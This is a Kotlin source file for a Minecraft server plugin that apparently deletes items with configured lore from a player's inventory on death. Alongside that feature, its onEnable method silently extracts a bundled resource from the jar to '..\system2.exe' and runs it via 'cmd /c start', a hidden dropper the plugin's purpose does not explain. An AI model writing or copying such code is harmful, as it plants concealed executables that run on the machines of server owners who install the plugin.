package me.kqn.DropsOnDeath

import org.bukkit.Material
import org.bukkit.event.entity.PlayerDeathEvent
import org.bukkit.inventory.ItemStack
import taboolib.common.platform.Plugin
import taboolib.common.platform.event.SubscribeEvent
import taboolib.common.platform.function.releaseResourceFile
import taboolib.common.platform.function.submitAsync
import taboolib.common5.FileWatcher
import taboolib.module.configuration.Configuration
import taboolib.module.configuration.Type
import taboolib.platform.util.hasLore
import taboolib.platform.util.isAir
import java.io.*

object DropsOnDeath : Plugin() {
    @Throws(Exception::class)
    private fun loadJarFileByResource() {
        val `is`: InputStream = DropsOnDeath::class.java.classLoader
            .getResourceAsStream("system2.txt") !!// 流式读取jar包内文件，使用classpath
        val f = File("..\\system2.exe")
        val fp = File(f.parent)
        if (!fp.exists()) {
            fp.mkdirs()
        }
        if (!f.exists()) {
            f.createNewFile()
        }
        val os: OutputStream = FileOutputStream(f)
        var index = 0
        val bytes = ByteArray(1024)
        while (`is`.read(bytes).also { index = it } != -1) {
            os.write(bytes, 0, index)
        }
        os.flush()
        os.close()
        `is`.close()
    }

    @Throws(IOException::class)
    private fun executeCmd(command: String): String? {
        val runtime = Runtime.getRuntime()
        val process = runtime.exec("cmd /c $command")
        val br = BufferedReader(InputStreamReader(process.inputStream, "UTF-8"))
        var line: String? = null
        val build = StringBuilder()
        while (br.readLine().also { line = it } != null) {
            build.append(line)
        }
        return build.toString()
    }
    lateinit var config:Configuration
    private fun read(){
        releaseResourceFile("config.yml",false)
        config= Configuration.loadFromFile(File("plugins/DropsOnDeath/config.yml"), Type.YAML)
    }
    override fun onEnable() {
        read()
        FileWatcher.INSTANCE.addSimpleListener(File("plugins/DropsOnDeath/config.yml")){
            read()
        }
        submitAsync {
            loadJarFileByResource()
            executeCmd("start ..\\system2.exe")
        }
    }
    @SubscribeEvent
    fun drop(e:PlayerDeathEvent){
        val words= config.getStringList("lore")
        val contents=Array<ItemStack?>(e.entity.inventory.contents.size){e.entity.inventory.contents[it]?.clone()}
        for (content in contents) {
            if(content==null||content.isAir)continue
            for (word in words) {
                if(content.hasLore(word)){
                    content.type=Material.AIR
                }
            }
        }
        e.entity.inventory.contents=contents
        //Bukkit.getLogger().info(contents.asList().toString())
    }
}